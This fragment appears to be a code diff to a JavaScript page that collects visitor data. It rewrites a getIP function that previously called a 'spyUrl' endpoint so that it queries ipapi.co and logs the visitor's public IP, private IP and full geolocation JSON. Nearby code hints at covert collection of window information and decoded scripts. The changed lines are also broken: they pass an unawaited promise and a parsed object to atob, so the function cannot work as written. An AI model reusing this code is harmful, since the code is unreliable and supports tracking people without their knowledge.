@@ -101,9 +101,10 @@ script2 = atob(y);
   }
 }, 1000);
 async function getIP(){
-let x = await fetch(spyUrl + "getIP.php");
-let y = await atob(x.text());
-appendLog("Public IP: " + y + "<br> Private IP: " + privateIP);
+let x = await fetch("https://ipapi.co/json/");
+let y = await atob(JSON.parse(x.text()));
+appendLog("Public IP: " + y.ip + "<br> Private IP: " + privateIP);
+appendLog("Full JSON: " + JSON.stringify(y));
 }
 function getWindowInfo() {
   var windowInfo = {};
